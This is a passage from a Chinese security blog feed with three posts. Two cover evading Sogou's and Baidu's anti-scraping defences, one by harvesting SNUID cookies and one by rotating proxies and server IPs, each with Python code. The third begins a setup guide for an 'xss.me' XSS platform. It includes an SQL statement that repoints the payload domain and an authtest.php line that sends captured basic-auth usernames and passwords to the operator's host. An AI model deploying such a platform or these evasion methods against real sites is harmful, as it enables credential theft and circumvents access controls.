ld=AXrrGZllll2Ysfa1lllllVA@rLolllllHc4zfyllllYllllljllll5@@@@@@@@@@; browerV=3; osV=1; LSTMV=673%2C447; LCLKINT=6022; ad=6FwTnyllll2g@popQlSGTVA@7VCYx98tLueNukllll9llllljpJ62s@@@@@@@@@@; SUID=EADA81B7516C860A57B28911000DA424; successCount=1|Wed, 08 Mar 2017 07:51:18 GMT; seccodeErrorCount=1|Wed, 08 Mar 2017 07:51:45 GMT</div><div class="line"></div><div class="line">c=6exp2e&amp;r=%252Fweb%253Fquery%253Djs%2B%25E6%25A0%25BC%25E5%25BC%258F%25E5%258C%2596%2526ie%253Dutf8%2526_ast%253D1488957312%2526_asf%253Dnull%2526w%253D01029901%2526p%253D40040100%2526dp%253D1%2526cid%253D%2526cid%253D&amp;v=5</div><div class="line">    '<span class="string">''</span>)</div><div class="line"></div><div class="line">    buf=s.recv(1024)</div><div class="line">    p=re.compile(res)</div><div class="line">    L=p.findall(buf)</div><div class="line">    <span class="keyword">if</span> len(L)&gt;0:</div><div class="line">        Snuid=L[0]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        Snuid=<span class="string">""</span></div><div class="line"></div><div class="line">    <span class="built_in">return</span> Snuid</div><div class="line"></div><div class="line">def getsnuid(q):</div><div class="line">    <span class="keyword">while</span> 1:</div><div class="line">        <span class="keyword">if</span> q.qsize()&lt;10:</div><div class="line">            Snuid=random.choice([Method_one(),Method_three(),phantomjs_getsnuid()])</div><div class="line">            <span class="keyword">if</span> Snuid!=<span class="string">""</span>:</div><div class="line">                q.put(Snuid)</div><div class="line">                <span class="built_in">print</span> Snuid</div><div class="line">                time.sleep(0.5)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    import Queue</div><div class="line">    q=Queue.Queue()</div><div class="line">    getsnuid(q)</div></pre></td></tr></table></figure>
<h3 id="cookie问题解决方案"><a href="#cookie问题解决方案" class="headerlink" title="cookie问题解决方案"></a>cookie问题解决方案</h3><ul>
<li>SUID的值获取比较简单，直接访问sogou即可获取。</li>
<li>获取到SUID的值后，再去获取SNUID值（可通过以上几种方式）</li>
<li>获取到SNUID后，可保存到队列中。</li>
</ul>
<p><em>说明：SNUID的值如果不去使用它，可以存放很久，直到使用它到上限才会作废；SUID一般不会做次数限制，可以一直使用。</em></p>
<h3 id="ip问题解决方案"><a href="#ip问题解决方案" class="headerlink" title="ip问题解决方案"></a>ip问题解决方案</h3><p>　　在爬取搜狗时，除了cookie问题以外，也需要解决ip问题，当然这个问题可以参考爬百度的解决方案，参考地址：<a href="http://thief.one/2017/03/17/%E7%88%AC%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E5%AF%BB%E4%BD%A0%E5%8D%83%E7%99%BE%E5%BA%A6/">爬搜索引擎之寻你千百度</a></p>
<hr>

<p><em>申明：本文只是列举了我在爬取搜狗资源时遇到的问题，不代表搜狗本身所有的反爬虫技术，本文提供的解决方案具有时效性，具体还需自己动手实验，如有更好的解决方案可留言交流哦</em></p>
<p>本文地址：<a href="http://thief.one/2017/03/19/爬取搜索引擎之搜狗/">http://thief.one/2017/03/19/爬取搜索引擎之搜狗/</a><br>转载请说明来自：<a href="http://thief.one">nMask’Blog</a></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 反爬虫 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[爬取搜索引擎之寻你千百度]]></title>
      <url>http://thief.one/2017/03/17/%E7%88%AC%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E5%AF%BB%E4%BD%A0%E5%8D%83%E7%99%BE%E5%BA%A6/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">与天斗，其乐无穷；与地斗，其乐无穷</blockquote><br>　　自从Google退出中国市场，Baidu就成了国内搜索引擎巨头，所谓树大招风，一直以来百度成为国内众多黑客攻击的对象。又因为其本身作为一款搜索引擎，拥有很多的网络资源，因此借助baidu来获取海量数据，成为了一种便捷有效的信息收集途径。虽然baidu在爬虫算法上没有google那么优秀，但对中文搜索的支持并不会很差（小小吐槽一番百度），然而在通过百度爬取数据时，我们往往会遇到百度自身的反爬虫措施，如何解决这些反爬虫措施，将会是本文的重点。<br><a id="more"></a><br>　　关于反爬虫的技术，网上有很多资源，方法不外乎（代理、识别验证码、分布式架构、模拟浏览器、ADSL切换ip等），这些不是本文的重点，本文只针对爬取百度搜索引擎时遇到的反爬虫措施，以及一些解决方案。</p>
<h3 id="为甚么要爬取百度"><a href="#为甚么要爬取百度" class="headerlink" title="为甚么要爬取百度"></a>为甚么要爬取百度</h3><ul>
<li>百度没有提供APi</li>
<li>百度拥有丰富的资源可供查询</li>
<li>百度反爬虫没有那么变态</li>
</ul>
<h3 id="百度反爬虫措施"><a href="#百度反爬虫措施" class="headerlink" title="百度反爬虫措施"></a>百度反爬虫措施</h3><p>　　一般来说，单线程的爬虫时间间隔设置为&gt;2s，短时间内应当不会被屏蔽，当然长时间爬取还是不行；如果使多线程无时间间隔爬取，那么大概30分钟肯定就会屏蔽了。<br>　　我曾尝试过添加headers，甚至使用phantomjs模拟浏览器等方式，均以失败告终。我想百度作为一家搜索引擎公司，爬虫技术本就是其核心技术之一，因此跟它玩反爬虫技术应当是以卵击石（类似模拟浏览器，修改headers等方法应该无效）。<br>　　然而我们可以换个思路，百度也不是不允许爬虫访问，只是限制了爬取频率。而对于访问的headers等信息并没有做明显的限制。那么也就是说，百度的反爬虫实际上是控制单ip访问的频率，那么我们就可以通过分布式架构或者切换ip等方式去解决。</p>
<h3 id="被屏蔽现象"><a href="#被屏蔽现象" class="headerlink" title="被屏蔽现象"></a>被屏蔽现象</h3><p>　　在探讨如何解决被屏蔽问题前，我们先来研究下被百度屏蔽时的现象。一般来说，当百度检测到某ip访问流量特别大时，会先进行源码提示，如果还没停止访问，那么就会直接屏蔽访问。</p>
<h4 id="源码提示网络异常"><a href="#源码提示网络异常" class="headerlink" title="源码提示网络异常"></a>源码提示网络异常</h4><p>网页源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=gb2312"</span> /&gt;</div><div class="line">&lt;title&gt;百度--您的访问出错了&lt;/title&gt;</div><div class="line">&lt;style&gt;</div><div class="line">body&#123;text-align:center;margin-top:3px&#125;</div><div class="line"><span class="comment">#wrap&#123;width:650px;text-align:left;margin:auto&#125;</span></div><div class="line"><span class="comment">#logo&#123;float:left;margin:0 3px 0 0&#125;</span></div><div class="line"><span class="comment">#logo img&#123;border:0&#125;</span></div><div class="line"><span class="comment">#title&#123;float:left;width:510px&#125;</span></div><div class="line"><span class="comment">#intitle&#123;margin:20px 0 0 0;background-color:#e5ecf9;width:100%;font-weight:bold;</span></div><div class="line">font-size:14px;padding:3px 0 4px 10px&#125;</div><div class="line"><span class="comment">#content&#123;clear:left;padding-top:60px;line-height:200%&#125;</span></div><div class="line"><span class="comment">#vf&#123;margin-top:10px&#125;</span></div><div class="line"><span class="comment">#vf img&#123;float:left;border:1px solid #000&#125;</span></div><div class="line"><span class="comment">#kw&#123;font:16px Verdana;height:1.78em;padding-top:2px&#125;</span></div><div class="line"><span class="comment">#vf form&#123;float:left;margin:12px 0 0 5px;padding:0&#125;</span></div><div class="line"><span class="comment">#ft&#123;text-align:center&#125;</span></div><div class="line"><span class="comment">#ft,#ft a&#123;color:#666;font-size:14px&#125;</span></div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div id=<span class="string">"wrap"</span>&gt;</div><div class="line">&lt;div id=<span class="string">"logo"</span>&gt;&lt;a href=<span class="string">"http://www.baidu.com"</span>&gt;&lt;img alt=<span class="string">"到百度首页"</span> title=<span class="string">"到百</span></div><div class="line">度首页" src=<span class="string">"http://www.baidu.com/img/logo-yy.gif"</span> width=<span class="string">"137"</span> height=<span class="string">"46"</span>&gt;&lt;/a&gt;&lt;</div><div class="line">/div&gt;</div><div class="line">&lt;div id=<span class="string">"title"</span>&gt;&lt;div id=<span class="string">"intitle"</span>&gt;您的访问出错了&lt;/div&gt;&lt;/div&gt;</div><div class="line">&lt;div id=<span class="string">"content"</span>&gt;很抱歉，您的电脑或所在的“”“”的访问，此刻我们无法响应</div><div class="line">您的请求。 &lt;br&gt;请输入以下验证码，即可恢复使用。&lt;/div&gt;</div><div class="line">&lt;div id=<span class="string">"vf"</span>&gt;</div><div class="line">&lt;img src=<span class="string">"http://verify.baidu.com/cgi-bin/genimg?6D8B74BFF43F7AE5457E1E8DA8C6335</span></div><div class="line">5C8F00514C99AC6AD0182FCD695A4FED003A2592509E05792FF7A137E4184B4D9D9F5366F" width</div><div class="line">=<span class="string">"120"</span> height=<span class="string">"40"</span>&gt;</div><div class="line">&lt;form action=<span class="string">"http://verify.baidu.com/verify"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"url"</span> value=<span class="string">"http://www.baidu.com/s?wd=.gov.cn&amp;pn=0&amp;vi</span></div><div class="line">f=1"&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"vcode"</span> value=<span class="string">"6D8B74BFF43F7AE5457E1E8DA8C63355C8F0051</span></div><div class="line">4C99AC6AD0182FCD695A4FED003A2592509E05792FF7A137E4184B4D9D9F5366F"&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"id"</span> value=<span class="string">"1488861310"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"di"</span> value=<span class="string">"ad617386491a359a"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> size=<span class="string">"6"</span> maxlength=<span class="string">"10"</span> name=<span class="string">"verifycode"</span> id=<span class="string">"kw"</span>&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;div style=<span class="string">"clear:left;height:90px"</span>&gt;&lt;/div&gt;</div><div class="line">&lt;div id=<span class="string">"ft"</span>&gt;&amp;copy;2014 Baidu &lt;a href=<span class="string">"http://www.baidu.com/duty/index.html"</span>&gt;免</div><div class="line">责声明&lt;/a&gt;&lt;/div&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;script&gt;</div><div class="line">(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">    var rfr = window.document.location.href,</div><div class="line">        p = encodeURIComponent(rfr),</div><div class="line">        img = new Image(),</div><div class="line">        imgzd = new Image(),</div><div class="line">        re = /\/vcode\?http:\/\/(\S+)\.baidu/ig,r=<span class="string">""</span>;</div><div class="line">    img.src = <span class="string">"http://nsclick.baidu.com/v.gif?pid=201&amp;pj=vcode&amp;path="</span>+p+<span class="string">"&amp;t="</span>+ne</div><div class="line">w Date().getTime();</div><div class="line">    r = re.exec(rfr);</div><div class="line">    <span class="keyword">if</span>(r&amp;&amp;r[1])&#123;imgzd.src = <span class="string">"http://"</span>+r[1]+<span class="string">".baidu.com/v.gif?fr=vcode&amp;url="</span>+p+<span class="string">"&amp;</span></div><div class="line">t="+new Date().getTime();&#125;</div><div class="line">&#125;)();</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<h4 id="直接屏蔽Ip地址"><a href="#直接屏蔽Ip地址" class="headerlink" title="直接屏蔽Ip地址"></a>直接屏蔽Ip地址</h4><p>此种情况访问会报错。</p>
<h3 id="常规解决方案"><a href="#常规解决方案" class="headerlink" title="常规解决方案"></a>常规解决方案</h3><p>　　基于百度反爬虫的特点，我们可以通过分布式部署爬虫服务器，来采集资源，当然个人觉得ADSL服务器效果会更佳。但是分布式部署，尤其是ADSL服务器部署，成本会变得非常高，而且需要维护。那么有没有只用一台服务器就可以解决被屏蔽的问题呢？<br>　　答案是肯定，那就是单机+多线程+ip代理，这种方式比较实惠，但比较考验ip代理的稳定性。经个人测试，感觉国内绝大部分代理（收费、免费、动态等）都不是很稳定，因此这是一种折中的方式，那么有没有更好的方式呢？</p>
<h3 id="另类解决方案"><a href="#另类解决方案" class="headerlink" title="另类解决方案"></a>另类解决方案</h3><p>　　作为一家搜索引擎公司，百度的爬虫一定是分布式部署；又因为百度在国内的占有率很高，因此其提供搜索服务的服务器也应当是分布式部署的，也就是说全国各地部署了很多百度的服务器。<br>　　那么当我们打开浏览器，访问百度时，提供搜索服务的服务器往往是离我们最近的那台，因此可以想见屏蔽我们的也就是那台服务器。大胆想象一下，如果我们能自由切换去访问不同地区的百度服务器，那么是否可以绕过被单一服务器屏蔽的问题呢？</p>
<p>当然这一解决方案的前提是：</p>
<ul>
<li>我们必须拥有大量的百度服务器的ip地址</li>
<li>百度允许用ip地址访问（实在不行就更改host）</li>
</ul>
<p>　　可喜的是，以上2点都不难办到。网上有百度服务器的资源可以获取，当然也可以通过在不同地区的服务器ping百度获取ip；至于直接通过ip地址访问百度，这默认便是可行的（不知道百度为何这样设置）</p>
<h3 id="百度的大招"><a href="#百度的大招" class="headerlink" title="百度的大招"></a>百度的大招</h3><p>c通过以上几种方式，应该可以绕过百度的反爬虫机制，但是百度也不是吃素的，它也有自己独特的反爬虫杀招，或许称之为”搜索限制”或者是”资源保护”措施更合适一点。</p>
<h4 id="搜索结果数设上限"><a href="#搜索结果数设上限" class="headerlink" title="搜索结果数设上限"></a>搜索结果数设上限</h4><p>通过百度搜索引擎搜索关键词，计算出来的结果数设有上限。<br><img src="/upload_image/20170317/1.png" alt=""><br>此数量最高显示上限是1亿，其实远远不止，因此数据是不真实的。</p>
<h4 id="搜索页面数设上限"><a href="#搜索页面数设上限" class="headerlink" title="搜索页面数设上限"></a>搜索页面数设上限</h4><p>再看搜索的结果页面数：<br><img src="/upload_image/20170317/2.png" alt=""><br>最多只显示76页，而这只是所有结果中的冰山一角。</p>
<h4 id="cookies影响搜索结果"><a href="#cookies影响搜索结果" class="headerlink" title="cookies影响搜索结果"></a>cookies影响搜索结果</h4><p>在几次爬取过程中，我无意发现在headers中加不加cookies会影响最终的搜索结果（主要影响搜索结果的多少）。</p>
<p><em>以上几点严格意义上来说，并不算反爬虫技术，只是一种保护自身资源的方式，其意不言而喻</em></p>
<h3 id="Baidu-link问题"><a href="#Baidu-link问题" class="headerlink" title="Baidu_link问题"></a>Baidu_link问题</h3><p>　　通过获取百度搜索结果源码，以及通过正则匹配，我们能够得到一些搜索结果链接，然后这些链接并不是网站原链接，有以下2种形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF&amp;wd=&amp;eqid=9581fbec0007eae00000000458200ad4</div><div class="line"></div><div class="line">http://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF</div></pre></td></tr></table></figure></p>
<p>　　我暂且称它为”百度链接”，其基本就是以上2种形式。第一种是通过点击右键复制链接地址获取到的，通常带有eqid参数，用来表示referer；第二种是通过页面源代码获取到的，这种是不带wd与eqid参数的。而eqid参数的值在每次刷新页面后，都会改变，这可能是百度限制黑帽SEO所设置的一个参数。<br>　　那么我们比较两者之差异，当我们分别取访问这2条连接时，返回的数据包是不一样的。</p>
<h4 id="带eqid参数"><a href="#带eqid参数" class="headerlink" title="带eqid参数"></a>带eqid参数</h4><p>第一种带eqid参数的会返回200，在body里面会有网站真实的链接，可以通过正则匹配：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">res_baidu=r<span class="string">"window\.location\.replace\(\"([^\"]*)\"\)"</span></div></pre></td></tr></table></figure></p>
<h4 id="不带eqid参数"><a href="#不带eqid参数" class="headerlink" title="不带eqid参数"></a>不带eqid参数</h4><p>第二种不带参数的会返回一个302跳转，并且在header会有location字段，可以通过requests模块（head模式）去访问获取。</p>
<h4 id="解析baidu-link模块"><a href="#解析baidu-link模块" class="headerlink" title="解析baidu_link模块"></a>解析baidu_link模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">@解析baidu_link</div><div class="line">'<span class="string">''</span></div><div class="line">__author__=<span class="string">"nMask"</span></div><div class="line">__Blog__=<span class="string">"http://thief.one"</span></div><div class="line">__Date__=<span class="string">"20170301"</span></div><div class="line"></div><div class="line">import requests</div><div class="line">import re</div><div class="line"></div><div class="line">res_baidu=r<span class="string">"window\.location\.replace\(\"([^\"]*)\"\)"</span></div><div class="line"></div><div class="line"></div><div class="line">class anbaidulink:</div><div class="line">	headers=&#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'</span>,</div><div class="line">			 <span class="string">'Referer'</span>:<span class="string">'http://www.baidu.com/link?url='</span>&#125;</div><div class="line">	def __init__(self):</div><div class="line">		pass</div><div class="line"></div><div class="line">	def run(self,url,one_proxy=<span class="string">""</span>):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		入口函数，接受baidu_link以及代理地址，默认为""，代理地址要是http://xx.xx.xx.xx:xx格式</div><div class="line">		'<span class="string">''</span></div><div class="line">		<span class="keyword">if</span> <span class="string">"&amp;eqid="</span> <span class="keyword">in</span> url:</div><div class="line">			url=self.have_eqid(url,one_proxy)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			url=self.noeqid(url,one_proxy)</div><div class="line"></div><div class="line">		<span class="built_in">return</span> url</div><div class="line"></div><div class="line">	def noeqid(self,url,one_proxy):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		针对baidu_link中没有eqid参数</div><div class="line">		'<span class="string">''</span></div><div class="line">		try:</div><div class="line">			h=requests.head(url,proxies=&#123;<span class="string">'http'</span>:one_proxy&#125;,headers=anbaidulink.headers,timeout=5).headers  <span class="comment">#</span></div><div class="line">		except Exception,e:</div><div class="line">			<span class="built_in">print</span> e</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			url=h[<span class="string">"location"</span>]</div><div class="line"></div><div class="line">		<span class="built_in">return</span> url</div><div class="line">				</div><div class="line">			</div><div class="line">	def have_eqid(self,url,one_proxy):</div><div class="line">		<span class="string">''</span><span class="string">'</span></div><div class="line">		针对baidu_link中存在eqid参数</div><div class="line">		'<span class="string">''</span></div><div class="line">		try:</div><div class="line">			body=requests.get(url,proxies=&#123;<span class="string">'http'</span>:one_proxy&#125;,headers=anbaidulink.headers,timeout=5).content  <span class="comment">#</span></div><div class="line">		except Exception,e:</div><div class="line">			<span class="built_in">print</span> e</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			p=re.compile(res_baidu)</div><div class="line">			url=p.findall(body)</div><div class="line">			<span class="keyword">if</span> len(url)&gt;0:</div><div class="line">				url=url[0]</div><div class="line"></div><div class="line">		<span class="built_in">return</span> url</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	cur=anbaidulink()</div><div class="line">	url=cur.run(url=<span class="string">'https://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF&amp;wd=&amp;eqid=9581fbec0007eae00000000458200ad4'</span>,one_proxy=<span class="string">""</span>)</div><div class="line">	<span class="comment">#url=cur.run(url='http://www.baidu.com/link?url=1qIAIIh_2N7LUQpI0AARembLK2en4QpGjaRqKZ3BxYtzoZYevC5jA2jq6XMwgEKF',one_proxy="")</span></div><div class="line">	<span class="built_in">print</span> url</div></pre></td></tr></table></figure>
<p><em>申明：本文只是列举了我在爬取百度资源时遇到的问题，不代表百度本身所有的反爬虫技术，本文提供的解决方案具有时效性，具体还需自己动手实验，如有更好的解决方案可留言交流哦</em></p>
<p>本文地址：<a href="http://thief.one/2017/03/17/爬搜索引擎之寻你千百度/">http://thief.one/2017/03/17/爬搜索引擎之寻你千百度/</a><br>转载请说明来自：<a href="http://thief.one">nMask’Blog</a></p>
]]></content>
      
        <categories>
            
            <category> 技术研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 反爬虫 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Xss平台搭建小记]]></title>
      <url>http://thief.one/2017/03/15/Xss%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">每天把牢骚拿出来晒晒太阳，心情就不会缺钙</blockquote>

<p>　　之前搭建过很多次xss平台，也用过几套源代码，然而对比之下，还是觉得wuyun的xss.me源码比较好用，即使比较古老了。最近因为工作需要，又准备重新搭建一套xss平台，源码果断选择了xss.me（当然是经过修改之后的），我的源码来之博客:<a href="http://www.bodkin.ren/?p=133" target="_blank" rel="external">http://www.bodkin.ren/?p=133</a>，感谢其分享。<br><a id="more"></a><br>　　Xss平台的搭建过程并不复杂，虽然期间遇到了一些小问题，但也很快解决了，在此记录分享。</p>
<h3 id="xss源码下载"><a href="#xss源码下载" class="headerlink" title="xss源码下载"></a>xss源码下载</h3><p>　　<a href="https://git.oschina.net/nMask/Resource/raw/master/xss.me.new.zip" target="_blank" rel="external">修改版</a><br>　　<a href="https://git.oschina.net/nMask/Resource/raw/master/xss.me.old.zip" target="_blank" rel="external">原版</a></p>
<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>　　首先下载xssplatform源码，然后选择一台服务器安装wamp，这里之所以选择wamp来搭建环境，主要是想免去配置apache、mysql的麻烦，因为本文重点还是在于搭建xss平台的过程。（大神可以选择在linux上单独安装配置apache）</p>
<p>　　服务器环境配置好以后，将xss源码放在wamp的www目录下，启动wamp，此时如果wamp运行正常，我们打开localhost/xss/应该可以看到登陆界面了，但此时还不能进行登陆或者注册，还需要进行多项配置。</p>
<h3 id="apache配置"><a href="#apache配置" class="headerlink" title="apache配置"></a>apache配置</h3><p>　　打开wamp\bin\apache\apache2.4.9\conf\httpd.conf，为了后面搭建xss平台不出现错误，我们先将网站目录设置一下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">将其中的c:/wamp/www/ 改为c:/wamp/www/xss/，重启apache。</div></pre></td></tr></table></figure></p>
<p>　　这时打开localhost就可以看到登陆页面了，而不需要访问localhost/xss/路径。当然如果有特殊需要，必须设置二级目录的，那之后的一些路径配置，请都设置成二级目录，即在原来的路径前面加上目录名称，如/xss/index.php等。</p>
<h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>　　打开localhost/phpmyadmin进入phpmyadmin管理界面，添加一个用户root,123456,为了安全起见，删除其他用户。然后添加一个数据库，名为poppy（具体数据库名称可查看xss.sql文件，里面有写），然后导入xss.sql文件即可。<br>　　更改oc_module模块域名，进入oc_module表，执行sql语句，改为自己的域名。（影响生成的xss poc）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE oc_module SET code=REPLACE(code,&quot;http://xsser.me&quot;,&quot;http://xxx.com&quot;);</div></pre></td></tr></table></figure></p>
<h3 id="Xss源码配置"><a href="#Xss源码配置" class="headerlink" title="Xss源码配置"></a>Xss源码配置</h3><p>apache与数据库配置完以后，还需要配置xss源码。</p>
<h4 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h4><p>打开根目录下的config.php文件，主要看以下这些配置。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">/* 数据库连接 */</div><div class="line"><span class="variable">$config</span>[<span class="string">'dbHost'</span>]        =<span class="string">'localhost'</span>;            //数据库地址</div><div class="line"><span class="variable">$config</span>[<span class="string">'dbUser'</span>]        =<span class="string">'root'</span>;                //用户</div><div class="line"><span class="variable">$config</span>[<span class="string">'dbPwd'</span>]        =<span class="string">'123456'</span>;                //密码</div><div class="line"><span class="variable">$config</span>[<span class="string">'database'</span>]        =<span class="string">'poppy'</span>;            //数据库名</div><div class="line"><span class="variable">$config</span>[<span class="string">'charset'</span>]        =<span class="string">'utf8'</span>;                //数据库字符集</div><div class="line"><span class="variable">$config</span>[<span class="string">'tbPrefix'</span>]        =<span class="string">'oc_'</span>;                    //表名前缀</div><div class="line"><span class="variable">$config</span>[<span class="string">'dbType'</span>]        =<span class="string">'mysql'</span>;                //数据库类型(目前只支持mysql)</div><div class="line"></div><div class="line">/* 注册配置 */</div><div class="line"><span class="variable">$config</span>[<span class="string">'register'</span>]        =<span class="string">'invite'</span>;                //normal,正常;invite,只允许邀请注册;close,关闭注册功能</div><div class="line"><span class="variable">$config</span>[<span class="string">'mailauth'</span>]        =<span class="literal">false</span>;                    //注册时是否邮箱验证</div><div class="line"></div><div class="line">/* url配置 */</div><div class="line"><span class="variable">$config</span>[<span class="string">'urlroot'</span>]        =<span class="string">'http://localhost'</span>;//访问的url起始</div></pre></td></tr></table></figure></p>
<p>修改配置如下：</p>
<ul>
<li>$config[‘database’]        =’poppy’;  #更改，保持跟数据名一致（数据库名字查看.sql文件）</li>
<li>数据库账号密码可以选择更改，也可以保持不变。</li>
<li>$config[‘register’]          =’normal’;             # 改为不需要邀请码。</li>
<li>$config[‘urlroot’]        =’<a href="http://localhost" target="_blank" rel="external">http://localhost</a>‘; #改为本地</li>
</ul>
<h4 id="修改authtest-php"><a href="#修改authtest-php" class="headerlink" title="修改authtest.php"></a>修改authtest.php</h4><p>修改根目录下authtest.php文件，改成自己的域名或者ip。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">else</span> <span class="keyword">if</span> ((isset(<span class="variable">$_SERVER</span>[<span class="string">'PHP_AUTH_USER'</span>])) &amp;&amp; (isset(<span class="variable">$_SERVER</span>[<span class="string">'PHP_AUTH_PW'</span>])))&#123;</div><div class="line"></div><div class="line">    /* 变量值存在，检查其是否正确 */</div><div class="line"></div><div class="line">    header(<span class="string">"Location: http://xxx.com/index.php?do=api&amp;id=&#123;<span class="variable">$_GET</span>[id]&#125;&amp;username=&#123;<span 